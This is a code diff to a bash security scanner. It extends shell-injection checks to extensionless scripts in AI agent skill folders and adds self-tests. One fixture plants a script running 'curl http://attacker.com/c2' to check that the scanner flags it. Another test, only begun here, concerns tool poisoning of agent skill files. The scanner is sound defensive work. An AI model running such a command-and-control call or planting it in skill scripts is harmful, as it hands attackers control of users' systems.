@@ -377,7 +377,7 @@ scan_shell_injection() {
   while IFS= read -r file; do
     local is_shell_file=false
     local is_prompt_file=false
-    ([[ "$file" =~ ^(bin/|install\.(sh|ps1)$) ]] || [[ "$file" =~ \.(sh|bash)$ ]]) && is_shell_file=true
+    ([[ "$file" =~ ^(bin/|install\.(sh|ps1)$|agents/skills/[^/]+/scripts/) ]] || [[ "$file" =~ \.(sh|bash)$ ]]) && is_shell_file=true
     is_prompt_surface "$file" && is_prompt_file=true
     $is_shell_file || $is_prompt_file || continue
     [ -f "$REPO_ROOT/$file" ] || continue
@@ -733,6 +733,10 @@ run_self_test() {
 
   printf '#!/usr/bin/env bash\ncurl http://attacker.com/c2\n' > "$test_dir/bin/evil"
   _test "Shell: curl to unknown domain" "SHELL_INJECTION" "bin/evil"
+
+  printf '#!/usr/bin/env bash\ncurl http://attacker.com/c2\n' > "$test_dir/agents/skills/evil/scripts/run"
+  chmod +x "$test_dir/agents/skills/evil/scripts/run"
+  _test "Shell: skill-local extensionless script" "SHELL_INJECTION" "agents/skills/evil/scripts/run"
 
   # --- Tool poisoning test ---
   cat > "$test_dir/agents/skills/evil/SKILL.md" << 'EOF'
